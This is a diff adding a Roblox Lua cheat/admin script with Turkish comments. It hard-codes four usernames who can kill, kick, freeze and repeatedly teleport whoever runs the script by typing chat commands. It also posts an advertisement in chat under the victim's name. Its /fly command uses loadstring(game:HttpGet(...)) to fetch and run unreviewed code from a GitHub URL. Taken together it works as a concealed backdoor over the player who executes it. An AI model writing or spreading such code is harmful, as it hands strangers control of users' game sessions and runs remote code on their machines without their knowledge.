@@ -1,0 +1,171 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Yetkililer
+local allowedUsers = {
+    ["q692q"] = true,
+    ["muhammet_bekir2004"] = true,
+    ["HilalWare_Lua"] = true,
+    ["Muhammet_bekir2003"] = true
+}
+
+local frozen = false
+local loopBringTargets = {} -- [adminName] = connection
+local firstMessageSent = false -- sadece 1 kez mesaj göndermek için
+
+-- Yönetici etiketi
+local function addAdminTag(player)
+    local function onCharacterAdded(character)
+        local head = character:WaitForChild("Head", 5)
+        if head then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2, 0)
+            billboard.Adornee = head
+            billboard.AlwaysOnTop = true
+            billboard.Parent = head
+
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = "Yönetici"
+            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.GothamBold
+            textLabel.Parent = billboard
+        end
+    end
+
+    player.CharacterAdded:Connect(onCharacterAdded)
+    if player.Character then
+        onCharacterAdded(player.Character)
+    end
+end
+
+-- Karakterin tüm parçalarını dondur / çöz
+local function setAnchoredAllParts(char, anchored)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = anchored
+        end
+    end
+end
+
+-- Chat mesajı gönder (ilk seferde reklam)
+local function sendFirstMessage()
+    if not firstMessageSent then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("By HilalWare.Lua New Scripts", "All")
+        firstMessageSent = true
+    end
+end
+
+local function sendChatMessage(msg)
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+end
+
+-- Oyuncu bul (isim duyarsız)
+local function findPlayerByName(name)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if string.lower(plr.Name) == string.lower(name) then
+            return plr
+        end
+    end
+end
+
+-- Komutlar
+local function setupCommands(adminPlayer)
+    adminPlayer.Chatted:Connect(function(message)
+        local args = string.split(message, " ")
+        local cmd = string.lower(args[1])
+        local targetName = args[2]
+        local targetPlayer = LocalPlayer -- varsayılan hedef
+
+        if targetName then
+            local found = findPlayerByName(targetName)
+            if found then
+                targetPlayer = found
+            else
+                return -- isim yanlışsa çalıştırma
+            end
+        end
+
+        if not allowedUsers[adminPlayer.Name] then
+            return
+        end
+
+        sendFirstMessage() -- tüm komutlardan önce sadece 1 kez yazdırır
+
+        if cmd == "/kill" then
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                targetPlayer.Character.Humanoid.Health = 0
+            end
+
+        elseif cmd == "/kick" then
+            if targetPlayer == LocalPlayer then
+                LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
+            end
+
+        elseif cmd == "/freeze" then
+            if targetPlayer.Character then
+                setAnchoredAllParts(targetPlayer.Character, true)
+            end
+
+        elseif cmd == "/unfreeze" then
+            if targetPlayer.Character then
+                setAnchoredAllParts(targetPlayer.Character, false)
+            end
+
+        elseif cmd == "/bring" then
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+            end
+
+        elseif cmd == "/fly" then
+            if targetPlayer == LocalPlayer then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
+            end
+
+        elseif cmd == "/unfly" then
+            if targetPlayer == LocalPlayer and _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
+                _G.FlyFunction(false)
+            end
+
+        elseif cmd == "/loopbring" then
+            if targetPlayer and not loopBringTargets[adminPlayer.Name] then
+                loopBringTargets[adminPlayer.Name] = game:GetService("RunService").Heartbeat:Connect(function()
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                        and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                    end
+                end)
+            end
+
+        elseif cmd == "/unloopbring" then
+            if loopBringTargets[adminPlayer.Name] then
+                loopBringTargets[adminPlayer.Name]:Disconnect()
+                loopBringTargets[adminPlayer.Name] = nil
+            end
+
+        elseif cmd == "/selam" then
+            if targetPlayer == LocalPlayer then
+                sendChatMessage("Alekümesselam")
+            end
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end
